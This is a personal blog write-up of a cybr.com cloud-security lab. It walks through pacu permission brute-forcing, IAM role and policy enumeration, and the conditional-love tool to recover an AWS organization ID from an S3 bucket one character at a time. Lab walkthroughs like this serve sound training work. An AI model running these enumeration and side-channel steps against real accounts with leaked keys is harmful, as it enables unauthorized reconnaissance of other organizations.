---
title: discover aws organization id via s3 bucket
published: 2025-03-08
description: ''
image: ../../assets/discover_aws_organization_id_via_s3_bucket/icon.png
tags: [aws]
category: 'cloud-security'
draft: false 
lang: ''
---

Lab: https://cybr.com/hands-on-labs/lab/discover-aws-organization-id-via-s3-bucket/


![](src/assets/discover_aws_organization_id_via_s3_bucket/Discover_AWS_Organization_ID_via_S3_Bucket_image_1.png)

here we are provided with an Access Key ID and a secrete access key (maybe from a breach or smtg)

the end goal is to recover the AWS organization ID

> Organization:
> Contains details about an organization. An organization is a collection of accounts that are centrally managed together using consolidated billing, organized hierarchically with organizational units (OUs), and controlled with policies .


# Enumeration

### configure a profile
lets first configure a profile with the given credentials

```bash
aws configure --profile cybr
```

now lets verify if our profile is configured correctly
```bash
aws sts get-caller-identity --profile cybr
```

```bash
{
    "UserId": "AIDAQGYBPW3XMMUDWOW3R",
    "Account": "014498641646",
    "Arn": "arn:aws:iam::014498641646:user/Daniel"
}
```

we see that the `userId` is the same as `Access Key ID`, and it is associated to a user called Daniel

### get permissions we have
we will use a tool called pacu 

after installing it, we start a new session and search for iam related commands, we found `iam__bruteforce_permissions` that will return to use the permissions our current user have

but first lets import our keys

```
import_keys cybr
```

```bash
run iam__bruteforce_permissions

...
2025-03-07 21:34:42,865 - 69621 - [INFO] -- Account Id  : 350973243370
2025-03-07 21:34:42,865 - 69621 - [INFO] -- Account Path: user/Daniel
2025-03-07 21:34:43,173 - 69621 - [INFO] Attempting common-service describe / list brute force.
2025-03-07 21:34:58,799 - 69621 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2025-03-07 21:35:01,948 - 69621 - [INFO] -- sts.get_caller_identity() worked!
2025-03-07 21:35:02,161 - 69621 - [INFO] -- sts.get_session_token() worked!
2025-03-07 21:35:03,841 - 69621 - [INFO] -- iam.list_roles() worked!
...
```
we see that we can do  `iam.list_roles()`

```bash
aws iam list-roles --profile cybr

...
{
            "Path": "/",
            "RoleName": "S3AccessImages",
            "RoleId": "AROAVDN5CV7VD3HONXEBS",
            "Arn": "arn:aws:iam::350973243370:role/S3AccessImages",
            "CreateDate": "2025-03-07T22:58:24+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::350973243370:user/Daniel"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Assumable role to demonstrate aws:ResourceOrgId",
            "MaxSessionDuration": 3600
        }
...
```

we notice this custom role

lets get policies of this role (what we can do if we have this role)

```bash
aws iam list-role-policies --role-name S3AccessImages --profile cybr

{
    "PolicyNames": [
        "AccessS3BucketObjects"
    ]
}
```


```bash
aws iam get-role-policy --role-name S3AccessImages --policy-name AccessS3BucketObjects --profile cybr


{
    "RoleName": "S3AccessImages",
    "PolicyName": "AccessS3BucketObjects",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "s3:ListBucket",
                    "s3:GetObject"
                ],
                "Resource": [
                    "arn:aws:s3:::img.cybrlabs.io",
                    "arn:aws:s3:::img.cybrlabs.io/*"
                ],
                "Effect": "Allow"
            }
        ]
    }
```

we see that this account have `ListObject` and `GetObject` Actions on another account `:img.cybrlabs.io`

# Exploitation
we will use a tool called conditional-love, to retrieve the organization ID character by character

```bash
python conditional-love.py --role arn:aws:iam::350973243370:role/S3AccessImages --target s3://img.cybrlabs.io --action=s3:HeadObject --condition=aws:ResourceOrgID --alphabet='0123456789abcdefghijklmnopqrstuvwxyz-' --profile cybr

```

![](src/assets/discover_aws_organization_id_via_s3_bucket/Discover_AWS_Organization_ID_via_S3_Bucket_image_2.png)



